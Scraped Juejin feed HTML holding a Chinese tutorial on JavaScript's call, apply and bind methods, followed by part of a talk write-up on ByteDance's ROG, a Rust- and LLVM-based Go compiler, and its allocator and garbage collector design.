content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript call、apply、bind 方法解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1678295463898875/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我叫黑大帅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:42:06.000Z" title="Wed Dec 10 2025 03:42:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript call、apply、bind 方法解析</h2>
<p>在 JavaScript 中，<code>call</code>、<code>apply</code>、<code>bind</code> 都是用来**<code>this</code>** <strong>改变函数执行时  指向</strong> 的核心方法，它们的核心目标一致，但使用方式、执行时机和传参形式有明显区别。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> dog = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"旺财"</span>,
  <span class="hljs-title function_">sayName</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-title function_">eat</span>(<span class="hljs-params">food</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 在吃<span class="hljs-subst">${food}</span>`</span>);
  },
  <span class="hljs-title function_">eats</span>(<span class="hljs-params">food1, food2</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 在吃<span class="hljs-subst">${food1}</span>和<span class="hljs-subst">${food2}</span>`</span>);
  },
};

<span class="hljs-keyword">const</span> cat = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"咪咪"</span>,
};
<span class="hljs-comment">// call 会立即执行函数，并且改变 this 指向</span>
dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">call</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>
dog.<span class="hljs-property">eat</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟'</span>

dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">apply</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>

dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>

dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">apply</span>(cat, [<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>]); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>

<span class="hljs-keyword">const</span> boundEats = dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">bind</span>(cat);
<span class="hljs-title function_">boundEats</span>(<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h3 data-id="heading-1">一、核心共性</h3>
<p>三者的核心作用：<strong><code>this</code></strong> <strong>手动指定函数执行时的  指向</strong>，突破函数默认的 <code>this</code> 绑定规则（比如对象方法的 <code>this</code> 原本指向对象本身，通过这三个方法可以强制指向其他对象）。</p>
<p>以示例中的 <code>dog.sayName()</code> 为例，默认执行时 <code>this</code> 指向 <code>dog</code>，但通过 <code>call/apply/bind</code> 可以让 <code>this</code> 指向 <code>cat</code>，从而输出 <code>咪咪</code> 而非 <code>旺财</code>。</p>
<h3 data-id="heading-2">二、逐个解析</h3>
<h4 data-id="heading-3">1. call</h4>
<ul>
<li>
<p><strong>执行时机</strong>：<strong>立即执行</strong> 函数</p>
</li>
<li>
<p><strong>传参方式</strong>：第一个参数是 <code>this</code> 要指向的目标对象，后续参数<strong>逐个单独传递</strong>（逗号分隔）</p>
</li>
<li>
<p><strong>语法</strong>：<code>函数.call(thisArg, arg1, arg2, ...)</code></p>
</li>
</ul>
<h5 data-id="heading-4">示例解析：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// this 指向 cat，无额外参数，立即执行 sayName</span>
dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">call</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>

<span class="hljs-comment">// this 指向 cat，额外参数 '🐟' 逐个传递，立即执行 eat</span>
dog.<span class="hljs-property">eat</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟'</span>

<span class="hljs-comment">// 多参数场景：参数逐个传递，立即执行 eats</span>
dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h4 data-id="heading-5">2. apply</h4>
<ul>
<li>
<p><strong>执行时机</strong>：<strong>立即执行</strong> 函数（和 <code>call</code> 一致）</p>
</li>
<li>
<p><strong>传参方式</strong>：第一个参数是 <code>this</code> 要指向的目标对象，后续参数<strong>必须放在一个数组（或类数组）中传递</strong></p>
</li>
<li>
<p><strong>语法</strong>：<code>函数.apply(thisArg, [arg1, arg2, ...])</code></p>
</li>
</ul>
<h5 data-id="heading-6">示例解析：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 无额外参数，数组可以为空（或不传），立即执行 sayName</span>
dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">apply</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>

<span class="hljs-comment">// 多参数场景：参数放在数组中传递，立即执行 eats</span>
dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">apply</span>(cat, [<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>]); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<p>注意：<code>apply</code> 适合参数数量不固定、或参数已存在于数组中的场景（比如 <code>Math.max.apply(null, [1,2,3])</code> 求数组最大值）。</p>
<h4 data-id="heading-7">3. bind</h4>
<ul>
<li>
<p><strong>执行时机</strong>：<strong>不立即执行</strong> 函数，而是返回一个<strong>绑定了新 this 指向的新函数</strong>，后续需要手动调用这个新函数才会执行</p>
</li>
<li>
<p><strong>传参方式</strong>：第一个参数是 <code>this</code> 要指向的目标对象，后续参数可以<strong>提前绑定（柯里化）</strong>，也可以在调用新函数时补充</p>
</li>
<li>
<p><strong>语法</strong>：<code>const 新函数 = 函数.bind(thisArg, arg1, arg2, ...); 新函数(剩余参数);</code></p>
</li>
</ul>
<h5 data-id="heading-8">示例解析：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 第一步：bind 不执行，仅绑定 this 为 cat，返回新函数 boundEats（原变量名 boundSayName 已修改）</span>
<span class="hljs-keyword">const</span> boundEats = dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">bind</span>(cat);

<span class="hljs-comment">// 第二步：手动调用新函数，传递参数 '🐟' 和 '🐔'，此时才执行 eats</span>
<span class="hljs-title function_">boundEats</span>(<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h5 data-id="heading-9">进阶用法：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 提前绑定部分参数（柯里化），this 仍指向 cat</span>
<span class="hljs-keyword">const</span> boundEatWithFish = dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">bind</span>(cat, <span class="hljs-string">"🐟"</span>);
<span class="hljs-comment">// 调用时补充剩余参数，同样输出目标结果</span>
<span class="hljs-title function_">boundEatWithFish</span>(<span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h3 data-id="heading-10">三、核心区别总结</h3>





























<table><thead><tr><th>特性</th><th>call</th><th>apply</th><th>bind</th></tr></thead><tbody><tr><td>执行时机</td><td>立即执行</td><td>立即执行</td><td>不立即执行，返回新函数</td></tr><tr><td>传参形式</td><td>逐个传递（逗号分隔）</td><td>数组/类数组传递</td><td>可提前绑定，也可调用时传</td></tr><tr><td>返回值</td><td>函数执行结果</td><td>函数执行结果</td><td>绑定 this 后的新函数</td></tr></tbody></table>
<h3 data-id="heading-11">四、常见使用场景</h3>
<ol>
<li>
<p><strong>call</strong>：适用于参数数量明确、需要立即执行的场景（比如继承：<code>Parent.call(this, arg1)</code>）；</p>
</li>
<li>
<p><strong>apply</strong>：适用于参数是数组/类数组的场景（比如求数组最大值：<code>Math.max.apply(null, arr)</code>）；</p>
</li>
<li>
<p><strong>bind</strong>：适用于需要延迟执行、或需要重复使用绑定 this 后的函数的场景（比如事件回调、定时器：<code>btn.onclick = fn.bind(obj)</code>）。</p>
</li>
</ol>
<h3 data-id="heading-12">五、补充注意点</h3>
<ul>
<li>
<p>如果第一个参数传 <code>null/undefined</code>，在非严格模式下，<code>this</code> 会指向全局对象（浏览器中是 <code>window</code>，Node 中是 <code>global</code>）；严格模式下 <code>this</code>为 <code>null/undefined</code>。</p>
</li>
<li>
<p><code>bind</code> 返回的新函数不能通过 <code>call/apply</code> 再次修改 <code>this</code> 指向（<code>bind</code> 的绑定是永久的）。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ROG 技术创新和业务落地：基于 Rust 的高性能 Go 编译器]]></title>    <link>https://juejin.cn/post/7581779319572856870</link>    <guid>https://juejin.cn/post/7581779319572856870</guid>    <pubDate>2025-12-10T03:44:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581779319572856870" data-draft-id="7581888578508341275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ROG 技术创新和业务落地：基于 Rust 的高性能 Go 编译器"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2025-12-10T03:44:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CloudWeGo"/> <meta itemprop="url" content="https://juejin.cn/user/3998273922407624"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ROG 技术创新和业务落地：基于 Rust 的高性能 Go 编译器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3998273922407624/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CloudWeGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:44:29.000Z" title="Wed Dec 10 2025 03:44:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>合作是技术创新的关键，Go 与 Rust 的跨界融合是优秀实践。多数团队在学习 Rust 时有难度，将大量 Go 代码转为 Rust 耗时费力且容易引发技术问题。</p>
<p>字节跳动在业务实践中也遇到了这个难题：大量 Go 服务在核心场景出现性能瓶颈，但重构难度大。此时，从编译器入手，在不改动代码、不增成本的前提下提升性能，而ROG 正是专注于高性能的 Go 与 Rust 跨界编译器。</p>
<p><strong>本文根据字节跳动服务框架团队研发工程师陈卓钰在 CloudWeGo 四周年技术沙龙上的演讲内容整理而成，详细解读了 ROG 的设计思路、核心实现以及在业务中的实际应用效果。</strong></p>
<p>点击链接可查看本次分享回放👉🏻<a href="https://link.juejin.cn?target=https%3A%2F%2Fb23.tv%2FYnSyAZy" target="_blank" title="https://b23.tv/YnSyAZy" ref="nofollow noopener noreferrer">b23.tv/YnSyAZy</a></p>
<h4 data-id="heading-0">一、业务痛点：当 Go 的性能成为瓶颈</h4>
<p>字节跳动有大量基于 Go 开发的服务，其中不少还是核心业务，Go 服务在整体服务中占比超过一半。但在一些计算量很大的场景下，Go 语言逐渐暴露出性能不足的问题，无法充分发挥现代 CPU 的计算能力，导致资源没有得到最优利用。
Go 语言更注重编译速度和开发效率，但在追求更高性能和更低成本的背景下，它编译后的代码执行效率成了"降本增效"的一大阻碍。之前，大部分优化工作都集中在技术架构和业务逻辑方面，而服务框架团队选择从编译器本身入手，在不改动任何业务代码的情况下，为庞大的 Go 服务体系提升性能。
对于 ROG 这类复杂项目，明确目标与非目标至关重要：</p>
<ul>
<li>
<p><strong>核心目标：</strong> 与 Go 语言特性完全兼容，保证任何合法 Go 程序在 ROG 中正常运行且结果一致；打造高性能运行环境；支持 LLVM 的高级优化功能如 LTO、PGO、BOLT 等；构建可扩展的编译器架构。</p>
</li>
<li>
<p><strong>非目标：</strong> 暂时不支持自举；不追求编译速度，开发阶段可用标准 Go 编译器提效，生产阶段切换 ROG 追求性能；暂时不兼容 Plan9 汇编和 linkname 内部符号，底层代码重写导致难以保证一致且兼容性实现难度大。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6658d7a43a304c718a673fc3be030bca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=Gm66DfnZKt10Puc7VU8U7aQBctw%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-1">二、技术挑战：在 LLVM 上重构带 GC 的编译型语言</h4>
<p>把 Go 和业界最成熟的编译器后端 LLVM 结合起来，并不是第一次尝试。但是，像版本老旧、没人维护的 <code>gccgo</code>，或者应用场景有限、功能不完整的 <code>TinyGo</code>，这些现有的方案都不能满足字节跳动大规模、高性能的业务需求。
因此，服务框架团队决定自己开发一款基于 Rust 和 LLVM 的全新 Go 编译器 ------ ROG。最大的挑战在于，LLVM 最初是为 C++ 这类没有 GC 功能的语言设计的，在处理像 Go 这种"编译型 + 带 GC"的语言时，会遇到三个主要问题：</p>
<ul>
<li>
<p><strong>GC 指针追踪</strong>：如何在 LLVM IR 层面准确地插入写屏障，保证 GC 能够追踪到所有指针，避免出现内存泄漏。</p>
</li>
<li>
<p><strong>栈动态扩缩容</strong>：Go 协程的栈空间会根据需要动态变化，在函数调用时需要插入额外的栈检查代码，而 LLVM 的标准流程里没有对这个功能的原生支持。</p>
</li>
<li>
<p><strong>抢占式调度</strong>：为了避免信号带来的复杂异步问题，ROG 需要设计一套基于 Checkpoint 的确定性调度机制，在函数开始时进行检查，防止某个任务长时间占用调度器。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ba6ec59a90742109717efe3160531b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=MOlOGcg0uWQZky%2BOdvD%2BP4LomfU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-2">三、方案设计：高性能、可扩展的 ROG 编译器</h4>
<p>ROG 的主要目标是在完全兼容 Go 语言特性的基础上，打造一款高性能、可扩展的编译器。它由前端、中间优化流程和基于 Rust 的运行环境组成，最后通过 LLVM 后端生成经过高度优化的机器码。ROG 包含多个核心组件，如内存分配器、垃圾回收器（GC）等。</p>
<h5 data-id="heading-3">（一）内存分配器：分级管理 + 无锁优化，解决主流方案痛点</h5>
<ul>
<li><strong>现有内存分配器的问题</strong>：团队研究了 jemalloc、TCMalloc、bdw - gc 等几种主流的内存分配方案，发现都不能完全满足需求。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16bc12af0d85437e9b78a94e1e14195c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=sCnaOHs72bMq7J9TS%2BKMWgyeR5c%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>ROG 分级内存管理方案设计</strong>：针对以上问题，团队设计了专门的方案，主要优点包括：支持最大 1TB 的堆内存，能够在运行时对对象进行索引，支持批量释放，并且缓存的局部性很好。</p>
</li>
<li>
<p><strong>核心分配逻辑</strong>：</p>
<ol>
<li>
<p>优先从当前线程的空闲内存块中获取内存，在频繁分配内存的场景下不需要加锁；</p>
</li>
<li>
<p>如果要分配的对象超过了一定大小，就会触发内存扩容，使用新的内存块来存储；</p>
</li>
<li>
<p>物理内存以操作系统的页面为基本单位，多个页面组合成 Chunk 进行统一管理；</p>
</li>
<li>
<p>P 和线程是一一对应的，线程操作 P 上的内存资源是线程私有的；只有在操作全局的 TLSFAlloc 和 BuddyAlloc 时才需要进行同步，这样能保证高性能。</p>
</li>
</ol>
</li>
</ul>
<h5 data-id="heading-4">（二）垃圾回收器：多策略支持 + 高效流程，兼顾兼容性与性能</h5>
<ul>
<li>
<p><strong>支持的 GC 策略</strong>：ROG 的垃圾回收器支持 STW GC、三色标记 GC 等多种算法，目前默认使用 STW GC。</p>
</li>
<li>
<p><strong>核心工作流程</strong>：</p>
<ol>
<li>
<p>标记准备：暂停所有的 P（逻辑处理器）和 G（协程），为标记阶段做准备；</p>
</li>
<li>
<p>并发标记：从 GCRoots 开始，多个线程同时标记存活的对象，把当前对象引用的未标记对象加入队列，直到所有能访问到的对象都被标记；</p>
</li>
<li>
<p>终止标记：因为 Go 支持 Finalizer 特性，有些对象需要"复活"，由单线程处理复活逻辑，同时复活相关对象及其引用的所有对象；</p>
</li>
<li>
<p>并发清理：直接清理没有被标记的对象，把标记为存活的对象作为下一次 GC 的初始对象，调用析构函数完成整个 GC 流程。</p>
</li>
</ol>
</li>
</ul>
